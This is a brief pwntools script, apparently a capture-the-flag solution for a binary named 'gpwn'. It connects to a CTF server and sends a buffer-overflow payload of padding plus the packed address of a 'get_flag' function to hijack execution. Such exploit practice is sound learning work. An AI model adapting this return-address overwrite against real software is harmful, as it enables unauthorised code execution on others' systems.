#!/usr/bin/python 
from pwn import *

#p = process("./gpwn")
p = remote("ctf.j0n9hyun.xyz", 3011)
elf = ELF("./gpwn")
get_flag = elf.symbols['get_flag']

p.sendline('I'*20 + 'A'*4 + p32(get_flag))

p.interactive()
